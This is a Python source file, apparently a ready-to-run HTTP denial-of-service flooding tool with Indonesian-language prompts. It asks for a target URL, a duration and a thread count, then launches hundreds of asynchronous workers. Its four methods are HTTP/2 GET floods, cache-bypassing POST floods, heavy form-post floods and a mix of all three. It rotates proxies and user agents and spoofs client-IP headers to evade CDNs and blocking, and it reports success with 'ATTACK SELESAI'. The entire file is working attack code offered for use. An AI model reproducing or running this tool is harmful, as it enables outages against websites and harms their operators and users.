import asyncio
import httpx
import ssl
import random
import os
import sys
import time
from urllib.parse import urlparse

BANNER = r"""
╔════════════════════════════════════════╗
║    QUANTUM FOLDER INTEGRATION 🌌       ║
║         [ PYTHON EDITION ]             ║
║         [ GACOR EDITION v2.0 ]         ║
╚════════════════════════════════════════╝
"""

TIMEOUT = 6

# ---------- INPUT MANUAL ----------
def input_config():
    print(BANNER)
    print("📝 ISI KONFIGURASI:\n")

    target = input("🌐 URL Target      : ").strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    duration = input("⏱️  Waktu (detik)   : ").strip()
    duration = int(duration) if duration.isdigit() else 180

    threads = input("🧵 Jumlah Threads  : ").strip()
    threads = int(threads) if threads.isdigit() else 500

    print("\n📌 METHOD:")
    print("   1. TLS     (HTTP/2 flood)")
    print("   2. BYPPAS  (bypass CDN)")
    print("   3. KILL    (heavy form flood)")
    print("   4. MIX     (gabungan — paling gacor)")
    method_choice = input("👉 Pilih [1-4]      : ").strip()

    method_map = {"1": "TLS", "2": "BYPPAS", "3": "KILL", "4": "MIX"}
    method = method_map.get(method_choice, "MIX")

    use_proxy = input("🔀 Pakai Proxy? [y/n]: ").strip().lower()
    use_proxy = use_proxy in ("y", "yes", "ya")

    return target, duration, threads, method, use_proxy


TARGET, DURATION, THREADS, METHOD, USE_PROXY = input_config()

parsed = urlparse(TARGET)
HOST   = parsed.hostname
PORT   = parsed.port or (443 if parsed.scheme == "https" else 80)
PATH   = parsed.path or "/"
SCHEME = parsed.scheme or "https"
BASE_URL = f"{SCHEME}://{HOST}"

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))

# ---------- LOAD PROXY ----------
proxies = []
if USE_PROXY:
    proxy_path = os.path.join(CURRENT_DIR, "proxy.txt")
    if os.path.exists(proxy_path):
        with open(proxy_path, "r", errors="ignore") as f:
            proxies = [l.strip() for l in f if l.strip() and ":" in l and not l.startswith("#")]
        print(f"✅ PROXY LOADED: {len(proxies)}")
    else:
        print("⚠️  proxy.txt TIDAK DITEMUKAN — pakai IP langsung")
        USE_PROXY = False
else:
    print("⚠️  Proxy dimatikan — pakai IP VPS langsung")

# ---------- LOAD UA ----------
ua_path = os.path.join(CURRENT_DIR, "ua.txt")
user_agents = []
if os.path.exists(ua_path):
    with open(ua_path, "r", errors="ignore") as f:
        user_agents = [l.strip() for l in f if l.strip() and not l.startswith("http")]
    print(f"✅ UA LOADED: {len(user_agents)}")
else:
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    ]
    print("⚠️  ua.txt TIDAK DITEMUKAN — pakai default UA")

if not user_agents:
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"]

print("\n" + "=" * 44)
print(f"[+] Target   : {TARGET}")
print(f"[+] Host     : {HOST}:{PORT}")
print(f"[+] Method   : {METHOD}")
print(f"[+] Threads  : {THREADS}")
print(f"[+] Duration : {DURATION}s")
print(f"[+] Proxy    : {len(proxies) if USE_PROXY else 0}")
print(f"[+] UA       : {len(user_agents)}")
print("=" * 44 + "\n")

# ---------- SSL ----------
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE
SSL_CTX.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM")

# ---------- HELPERS ----------
def rand_ua():
    return random.choice(user_agents)

def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def rand_path():
    return f"{PATH}?{random.randint(1, 9999999)}={random.random()}&r={random.randint(1, 99999)}"

def rand_proxy():
    if not USE_PROXY or not proxies:
        return None
    p = random.choice(proxies)
    return f"http://{p}"

def gen_headers():
    return {
        "User-Agent": rand_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
        "X-Forwarded-For": rand_ip(),
        "X-Real-IP": rand_ip(),
        "X-Originating-IP": rand_ip(),
        "CF-Connecting-IP": rand_ip(),
        "True-Client-IP": rand_ip(),
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",
    }

# ---------- GLOBAL COUNTER ----------
counter = [0]
errors = [0]
sent = [0]


# ============================================================
# METHOD: TLS (HTTP/2 flood)
# ============================================================
async def method_tls(end_time):
    while time.time() < end_time:
        sent[0] += 1
        proxy = rand_proxy()
        try:
            transport = httpx.AsyncHTTPTransport(verify=False, retries=0)
            async with httpx.AsyncClient(
                http2=True,
                verify=False,
                timeout=TIMEOUT,
                transport=transport,
                proxy=proxy,
                limits=httpx.Limits(max_connections=0, max_keepalive_connections=0),
            ) as c:
                await c.get(rand_path(), headers=gen_headers())
            counter[0] += 1
        except Exception:
            errors[0] += 1


# ============================================================
# METHOD: BYPPAS (bypass CDN + cache)
# ============================================================
async def method_byppas(end_time):
    while time.time() < end_time:
        sent[0] += 1
        proxy = rand_proxy()
        try:
            transport = httpx.AsyncHTTPTransport(verify=False, retries=0)
            h = gen_headers()
            h["Content-Type"] = "application/x-www-form-urlencoded"
            h["Cache-Control"] = "no-cache, no-store"
            async with httpx.AsyncClient(
                http2=True,
                verify=False,
                timeout=TIMEOUT,
                transport=transport,
                proxy=proxy,
            ) as c:
                await c.post(rand_path(), headers=h, content=b"x" * 2048)
            counter[0] += 1
        except Exception:
            errors[0] += 1


# ============================================================
# METHOD: KILL (heavy form flood)
# ============================================================
async def method_kill(end_time):
    while time.time() < end_time:
        sent[0] += 1
        proxy = rand_proxy()
        try:
            transport = httpx.AsyncHTTPTransport(verify=False, retries=0)
            payload = "&".join(f"f{i}={rand_ip()}" for i in range(80))
            h = gen_headers()
            h["Content-Type"] = "application/x-www-form-urlencoded"
            async with httpx.AsyncClient(
                http2=True,
                verify=False,
                timeout=TIMEOUT,
                transport=transport,
                proxy=proxy,
            ) as c:
                await c.post(rand_path(), headers=h, content=payload)
            counter[0] += 1
        except Exception:
            errors[0] += 1


# ============================================================
# METHOD: MIX (paling gacor)
# ============================================================
async def method_mix(end_time):
    methods = [method_tls, method_byppas, method_kill]
    while time.time() < end_time:
        choice = random.choice(methods)
        await choice(end_time)


METHODS = {
    "TLS": method_tls,
    "BYPPAS": method_byppas,
    "KILL": method_kill,
    "MIX": method_mix,
}


# ============================================================
# WORKER
# ============================================================
async def worker(end_time, wid):
    method = METHODS.get(METHOD, method_mix)
    await method(end_time)


# ============================================================
# MONITOR
# ============================================================
async def monitor(end_time, start):
    last_req = 0
    while time.time() < end_time:
        await asyncio.sleep(1)
        elapsed = time.time() - start
        current = counter[0]
        rps = (current - last_req)
        last_req = current
        total_rps = current / elapsed if elapsed > 0 else 0
        sys.stdout.write(
            f"\r\x1b[93m[{elapsed:6.1f}s] OK: {current:>8} | "
            f"ERR: {errors[0]:>8} | SENT: {sent[0]:>8} | "
            f"RPS: {rps:>5} | AVG: {total_rps:>6.0f} | "
            f"TH: {THREADS}\x1b[0m"
        )
        sys.stdout.flush()
    print()


# ============================================================
# MAIN
# ============================================================
async def main():
    print(f"[+] Launching {THREADS} workers...\n")
    start = time.time()
    end_time = start + DURATION

    tasks = [asyncio.create_task(worker(end_time, i)) for i in range(THREADS)]
    tasks.append(asyncio.create_task(monitor(end_time, start)))

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")

    print(f"\n\x1b[92m✅ ATTACK SELESAI!\x1b[0m")
    print(f"   OK  : {counter[0]}")
    print(f"   ERR : {errors[0]}")
    print(f"   SENT: {sent[0]}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)